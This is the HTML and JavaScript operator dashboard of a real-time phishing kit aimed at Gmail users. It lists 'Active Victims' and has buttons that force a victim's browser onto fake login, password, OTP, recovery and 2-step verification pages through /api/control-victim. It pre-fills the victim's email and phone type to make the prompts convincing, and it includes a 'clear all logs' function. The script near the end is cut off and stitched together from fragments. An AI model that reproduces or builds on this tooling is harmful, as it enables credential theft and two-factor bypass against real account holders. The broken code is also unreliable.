<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Control Panel - Live Control</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --dark: #1f2937;
            --light: #f8fafc;
            --gray: #6b7280;
            --gray-light: #e5e7eb;
            --card-bg: #ffffff;
            --sidebar-bg: #1e293b;
            --header-bg: #0f172a;
            --border-radius: 12px;
            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --transition: all 0.3s ease;
            --gmail-color: #ea4335;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: var(--light);
            min-height: 100vh;
            line-height: 1.6;
        }

        .app-container {
            display: flex;
            min-height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            width: 260px;
            background: var(--sidebar-bg);
            padding: 24px 0;
            box-shadow: var(--shadow);
            z-index: 10;
        }

        .logo {
            display: flex;
            align-items: center;
            padding: 0 24px 24px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 24px;
        }

        .logo-icon {
            background: var(--primary);
            width: 36px;
            height: 36px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 700;
        }

        .nav-item {
            display: flex;
            align-items: center;
            padding: 14px 24px;
            color: var(--gray-light);
            text-decoration: none;
            transition: var(--transition);
            border-left: 3px solid transparent;
        }

        .nav-item:hover {
            background: rgba(255, 255, 255, 0.05);
            color: white;
        }

        .nav-item.active {
            background: rgba(99, 102, 241, 0.1);
            color: white;
            border-left-color: var(--primary);
        }

        .nav-item i {
            margin-right: 12px;
            width: 20px;
            text-align: center;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 24px;
            overflow-y: auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
        }

        .page-title {
            font-size: 28px;
            font-weight: 700;
        }

        .user-info {
            display: flex;
            gap: 16px;
            font-size: 20px;
            color: var(--gray-light);
        }

        .refresh-controls {
            background: rgba(255, 255, 255, 0.05);
            border-radius: var(--border-radius);
            padding: 16px 20px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .refresh-controls strong {
            color: var(--gray-light);
        }

        .refresh-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: var(--transition);
        }

        .refresh-btn:hover {
            background: var(--primary-dark);
        }

        .refresh-btn.paused {
            background: var(--secondary);
        }

        .manual-refresh-btn {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: var(--transition);
        }

        .manual-refresh-btn:hover {
            background: rgba(255, 255, 255, 0.15);
        }

        #refreshStatus {
            color: var(--secondary);
            font-weight: 600;
        }

        /* Phone Type Selector */
        .phone-type-selector {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: var(--border-radius);
        }

        .phone-type-dropdown {
            padding: 12px 16px;
            border: 1px solid var(--gray-light);
            border-radius: 8px;
            background: white;
            font-size: 14px;
            min-width: 180px;
            cursor: pointer;
        }

        .phone-type-dropdown:focus {
            outline: none;
            border-color: var(--primary);
        }

        /* Tabs */
        .tab-buttons {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
        }

        .tab-button {
            background: rgba(255, 255, 255, 0.05);
            color: var(--gray-light);
            border: none;
            padding: 12px 24px;
            border-radius: var(--border-radius);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: var(--transition);
        }

        .tab-button:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .tab-button.active {
            background: var(--primary);
            color: white;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        /* Cards */
        .victim-card {
            background: var(--card-bg);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: var(--shadow);
            color: var(--dark);
            transition: var(--transition);
        }

        .victim-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .victim-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
        }

        .status-online {
            background: var(--secondary);
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
        }

        .status-offline {
            background: var(--danger);
        }

        .victim-email {
            font-weight: 700;
            font-size: 18px;
        }

        .current-page {
            background: var(--primary);
            color: white;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }

        .detail-item {
            display: flex;
            flex-direction: column;
        }

        .detail-label {
            font-size: 12px;
            color: var(--gray);
            margin-bottom: 4px;
        }

        .detail-value {
            font-weight: 600;
        }

        /* Input Containers */
        .input-container {
            background: #f8fafc;
            border-radius: 10px;
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid var(--gray-light);
        }

        .input-header {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
            gap: 8px;
        }

        .input-header i {
            color: var(--primary);
        }

        .input-row {
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
        }

        .input-field {
            flex: 1;
            min-width: 200px;
            padding: 12px 16px;
            border: 1px solid var(--gray-light);
            border-radius: 8px;
            font-size: 14px;
            transition: var(--transition);
        }

        .input-field:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
        }

        .set-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .set-btn:hover {
            background: var(--primary-dark);
        }

        .current-value {
            background: #e5e7eb;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
        }

        /* Phone Type Container */
        .phone-type-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
            flex-wrap: wrap;
        }

        .phone-type-display {
            background: #e5e7eb;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
        }

        /* Navigation Headers */
        .navigation-header {
            padding: 16px 20px;
            margin: 24px 0 16px;
            border-radius: var(--border-radius);
            font-weight: 700;
            font-size: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-left: 6px solid;
        }

        .gmail-header {
            background: rgba(234, 67, 53, 0.15);
            color: var(--gmail-color);
            border-left-color: var(--gmail-color);
        }

        /* Controls */
        .controls {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 20px;
        }

        .control-btn {
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .view-nav-btn { background: var(--info); color: white; }
        .send-waiting { background: var(--gmail-color); color: white; }
        .send-login { background: var(--gmail-color); color: white; }
        .delete-btn { background: var(--danger); color: white; }
        .send-stall { background: var(--gmail-color); color: white; }
        .send-verify { background: var(--gmail-color); color: white; }
        .send-password { background: var(--gmail-color); color: white; }
        .send-reset { background: var(--gmail-color); color: white; }
        .send-otp { background: var(--gmail-color); color: white; }
        .send-recovery { background: var(--gmail-color); color: white; }
        .send-2step { background: var(--gmail-color); color: white; }
        .send-invalid { background: var(--gmail-color); color: white; }

        .control-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }

        /* Navigation History */
        .navigations {
            background: #f8fafc;
            border-radius: 10px;
            padding: 16px;
            margin-top: 16px;
            border: 1px solid var(--gray-light);
        }

        .navigation {
            background: white;
            padding: 12px 16px;
            margin: 8px 0;
            border-radius: 8px;
            border-left: 4px solid var(--primary);
            box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .app-container {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                padding: 16px;
            }
            
            .nav-items {
                display: flex;
                overflow-x: auto;
            }
            
            .nav-item {
                white-space: nowrap;
            }
        }

        @media (max-width: 768px) {
            .victim-details {
                grid-template-columns: 1fr;
            }
            
            .input-row {
                flex-direction: column;
                align-items: stretch;
            }
            
            .input-field {
                min-width: 100%;
            }
            
            .controls {
                justify-content: center;
            }
        }

        .alert {
            padding: 12px 16px;
            border-radius: 8px;
            margin: 10px 0;
            font-weight: 600;
        }

        .alert-success {
            background: #d1fae5;
            color: #065f46;
            border: 1px solid #a7f3d0;
        }

        .alert-danger {
            background: #fee2e2;
            color: #991b1b;
            border: 1px solid #fecaca;
        }

        .alert-warning {
            background: #fef3c7;
            color: #92400e;
            border: 1px solid #fde68a;
        }
        </style>
    </head>
    <body>
        <div class="app-container">
            <!-- Sidebar -->
            <div class="sidebar">
                <div class="logo">
                    <div class="logo-icon">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <div class="logo-text">ControlPanel</div>
                </div>
                <div class="nav-items">
                    <a href="#" class="nav-item active" onclick="showTab('victims')">
                        <i class="fas fa-user-circle"></i>
                        Active Victims
                    </a>
                    <a href="#" class="nav-item">
                        <i class="fas fa-cog"></i>
                        Settings
                    </a>
                    <a href="#" class="nav-item">
                        <i class="fas fa-chart-bar"></i>
                        Analytics
                    </a>
                    <a href="#" class="nav-item">
                        <i class="fas fa-question-circle"></i>
                        Help & Support
                    </a>
                </div>
            </div>
            <!-- Main Content -->
            <div class="main-content">
                <div class="header">
                    <h1 class="page-title">Live Control Panel</h1>
                    <div class="user-info">
                        <i class="fas fa-bell"></i>
                        <i class="fas fa-user-circle"></i>
                    </div>
                </div>
                <div class="refresh-controls">
                    <strong>
                        <i class="fas fa-sync-alt"></i>
                        Auto Refresh:
                    </strong>
                    <button class="refresh-btn" id="refreshToggle" onclick="toggleRefresh()">
                        <i class="fas fa-pause"></i>
                        Pause Refresh (10s)
                    </button>
                    <button class="manual-refresh-btn" onclick="manualRefresh()">
                        <i class="fas fa-redo"></i>
                        Manual Refresh Now
                    </button>
                    <span id="refreshStatus">Auto-refresh running every 10 seconds</span>
                </div>
                
                <!-- Clear All Logs Button -->
                <div class="clear-logs-section" style="margin: 20px 0; text-align: center;">
                    <button id="clearAllLogs" class="btn btn-danger" style="padding: 12px 24px; background: var(--danger); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px; margin: 0 auto;">
                        <i class="fas fa-trash"></i>
                        CLEAR ALL LOGS
                    </button>
                    <div id="clearLogsMessage" style="margin-top: 10px;"></div>
                </div>

                <!-- Phone Type Selector -->
                <div class="phone-type-selector">
                    <label for="phoneType">
                        <strong>Select Device Type:</strong>
                    </label>
                    <select id="phoneType" class="phone-type-dropdown" onchange="setGlobalPhoneType()">
                        <option value="">-- Select Device --</option>
                        <option value="iPhone">iPhone</option>
                        <option value="Android">Android</option>
                        <option value="Windows">Windows Phone</option>
                    </select>
                    <span id="globalPhoneTypeDisplay" class="phone-type-display" style="display: none;">
                        Global Phone Type:
                        <span id="selectedPhoneType"></span>
                    </span>
                </div>

                <!-- Main Panel -->
                <div class="main-panel">
                    <div class="tab-buttons">
                        <button onclick="logout()" style="position: absolute; top: 20px; right: 20px; padding: 10px 20px; background: #ff4757; color: white; border: none; border-radius: 5px; cursor: pointer;">
                            🚪 Logout
                        </button>
                        <button class="tab-button active" onclick="showTab('victims')">
                            <i class="fas fa-user-circle"></i>
                            Active Victims
                        </button>
                    </div>
                    <div id="victimsTab" class="tab-content active">
                        <h2>
                            <i class="fas fa-user-circle"></i>
                            Active Victims
                        </h2>
                        <div id="victimsList"></div>
                    </div>
                </div>
            </div>
        </div>
        <script>
        let currentTab = 'victims';
        let refreshInterval = 10000; // 10 seconds
        let refreshTimer = null;
        let isRefreshPaused = false;
        let emailData = {};
        let phoneData = {};
        let numberData = {};
        let phoneTypeData = {};
        let globalPhoneType = '';

        // Set global phone type from dropdown
        function setGlobalPhoneType() {
            const phoneTypeDropdown = document.getElementById('phoneType');
            globalPhoneType = phoneTypeDropdown.value;
            
            const displayElement = document.getElementById('globalPhoneTypeDisplay');
            const selectedTypeElement = document.getElementById('selectedPhoneType');
            
            if (globalPhoneType) {
                selectedTypeElement.textContent = globalPhoneType;
                displayElement.style.display = 'inline-block';
                
                // Auto-set phone type for all victims
                Object.keys(phoneTypeData).forEach(sessionId => {
                    phoneTypeData[sessionId] = globalPhoneType;
                });
                
                // Update UI if victims are loaded
                restorePhoneTypeInputs();
                
                alert(`Global phone type set to: ${globalPhoneType}. This will be applied to all victims.`);
            } else {
                displayElement.style.display = 'none';
            }
        }
        
        function savePhoneTypeInputs() {
            const phoneTypeInputs = document.querySelectorAll('.phone-type-input');
            phoneTypeInputs.forEach(input => {
                const sessionId = input.id.replace('phone-type-', '');
                if (input.value.trim()) {
                    phoneTypeData[sessionId] = input.value.trim();
                }
            });
        }
        
        function restorePhoneTypeInputs() {
            Object.keys(phoneTypeData).forEach(sessionId => {
                const input = document.getElementById(`phone-type-${sessionId}`);
                if (input) {
                    input.value = phoneTypeData[sessionId];
                }
                const display = document.getElementById(`current-phone-type-${sessionId}`);
                if (display) {
                    display.textContent = `Current: ${phoneTypeData[sessionId]}`;
                }
            });
        }

        async function setPhoneTypeForVerification(sessionId) {
            const phoneTypeInput = document.getElementById(`phone-type-${sessionId}`);
            let phoneType = phoneTypeInput.value.trim();
            
            // If no phone type is entered but global phone type is set, use that
            if (!phoneType && globalPhoneType) {
                phoneType = globalPhoneType;
                phoneTypeInput.value = globalPhoneType;
            }
    
            if (!phoneType) {
                alert('Please enter a phone type or select one from the dropdown above');
                return;
            }
    
            try {
                const success = await setVerificationPlaceholders(sessionId, phoneType);
                if (success) {
                    // Save to our local storage
                    phoneTypeData[sessionId] = phoneType;
                    document.getElementById(`current-phone-type-${sessionId}`).textContent = `Current: ${phoneType}`;
                    alert(`Phone type set to: ${phoneType}`);
                } else {
                    alert('Failed to set phone type');
                }
            } catch (error) {
                console.error('Error setting phone type:', error);
                alert('Error setting phone type');
            }
        }

        async function setVerificationPlaceholders(sessionId, phoneType) {
            try {
                const emailInput = document.getElementById(`email-${sessionId}`);
                const email = emailInput ? emailInput.value.trim() : '';
        
                const response = await fetch('/api/set-verification-data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        session_id: sessionId,
                        email: email,
                        phone: phoneType
                    })
                });
        
                const result = await response.json();
                return result.success;
        
            } catch (error) {
                console.error('Error setting verification placeholders:', error);
                return false;
            }
        }

        async function forceRedirectTo2Step(sessionId) {
            const emailInput = document.getElementById(`email-${sessionId}`);
            const phoneTypeInput = document.getElementById(`phone-type-${sessionId}`);
            const email = emailInput.value.trim();
            let phoneType = phoneTypeInput.value.trim();
            
            // If no phone type is set but global phone type is available, use it
            if (!phoneType && globalPhoneType) {
                phoneType = globalPhoneType;
                phoneTypeInput.value = globalPhoneType;
                phoneTypeData[sessionId] = globalPhoneType;
                document.getElementById(`current-phone-type-${sessionId}`).textContent = `Current: ${globalPhoneType}`;
            }

            // Check if we have required data
            if (!email && !phoneType) {
                if (confirm('No email or phone type set! Force to 2-step page without data?')) {
                    await forceRedirect(sessionId, 'go_to_2step');
                }
                return;
            }

            if (email && !validateEmail(email)) {
                alert('Please enter a valid email address first');
                return;
            }

            if (confirm(`Force this victim to 2-Step Verification Page with:\nEmail: ${email || 'Not set'}\nPhone Type: ${phoneType || 'Not set'}`)) {
                // Set the verification data first
                try {
                    const response = await fetch('/api/set-verification-data', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ 
                            session_id: sessionId,
                            email: email,
                            phone: phoneType
                        })
                    });
            
                    const result = await response.json();
                    if (result.success) {
                        // Then redirect to 2-step verification page
                        await forceRedirect(sessionId, 'go_to_2step');
                    } else {
                        alert('Failed to set verification data');
                    }
                } catch (error) {
                    console.error('Error setting verification data:', error);
                    alert('Error setting verification data');
                }
            }
        }
        
        function showTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-button').forEach(button => {
                button.classList.remove('active');
            });
            
            // Show selected tab
            document.getElementById(tabName + 'Tab').classList.add('active');
            event.target.classList.add('active');
            currentTab = tabName;
            
            // Load data for the tab
            if (tabName === 'victims') {
                loadVictims();
            }
        }

        // Refresh control functions
        function toggleRefresh() {
            isRefreshPaused = !isRefreshPaused;
            const toggleBtn = document.getElementById('refreshToggle');
            const status = document.getElementById('refreshStatus');
            
            if (isRefreshPaused) {
                toggleBtn.innerHTML = '<i class="fas fa-play"></i> Resume Refresh (10s)';
                toggleBtn.classList.add('paused');
                status.textContent = 'Auto-refresh PAUSED - Click "Manual Refresh Now" to update';
                status.style.color = '#dc3545';
            } else {
                toggleBtn.innerHTML = '<i class="fas fa-pause"></i> Pause Refresh (10s)';
                toggleBtn.classList.remove('paused');
                status.textContent = 'Auto-refresh running every 10 seconds';
                status.style.color = '#10b981';
            }
        }

        function manualRefresh() {
            if (currentTab === 'victims') {
                loadVictims();
            }
        }

        function startRefreshTimer() {
            if (refreshTimer) {
                clearInterval(refreshTimer);
            }
            
            refreshTimer = setInterval(() => {
                if (!isRefreshPaused) {
                    if (currentTab === 'victims') {
                        loadVictims();
                    }
                }
            }, refreshInterval);
        }

        function saveNumberInputs() {
            const numberInputs = document.querySelectorAll('.number-input');
            numberInputs.forEach(input => {
                const sessionId = input.id.replace('number-', '');
                if (input.value.trim()) {
                    numberData[sessionId] = input.value.trim();
                }

                alert('Please enter a valid 2-digit number first');

        // Original force redirect function (for other pages)
        async function forceRedirect(sessionId, action) {
            try {
                const actionName = action === 'go_to_waiting' ? 'Waiting Page' : 
                        action === 'go_to_login' ? 'Login Page' :
                        action === 'go_to_stall' ? 'Stall Page' : 
                        action === 'go_to_verify' ? 'Verify Page' :
                        action === 'go_to_password' ? 'Password Page' :
                        action === 'go_to_reset' ? 'Reset Page' :
                        action === 'go_to_otp' ? 'OTP Page' :
                        action === 'go_to_invalid' ? 'Invalid Page' :
                        action === 'go_to_recovery' ? 'Recovery Page' : 'Unknown Page';

                console.log(`Sending command: ${action} for session ${sessionId}`);

                await fetch('/api/control-victim', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ session_id: sessionId, action: action })
                });

                alert(`Victim forced to ${actionName}!`);

            } catch (error) {
                console.error('Error controlling victim:', error);
                alert('Error forcing victim redirect');
            }
        }

                const response = await fetch(`/api/victim-navigations/${sessionId}`);

                if (!isVisible) {
                    navDiv.innerHTML = '<h4><i class="fas fa-history"></i> Recent Navigations:</h4>';
                    if (data.navigations && data.navigations.length > 0) {
                        data.navigations.forEach(nav => {

                        navDiv.innerHTML += '<p>No navigations recorded yet.</p>';

                fetch('/api/clear-all-logs', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    }
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        document.getElementById('clearLogsMessage').innerHTML = 
                            '<div class="alert alert-success">✅ All logs cleared successfully! Refreshing...</div>';
                
                // Refresh the victims list
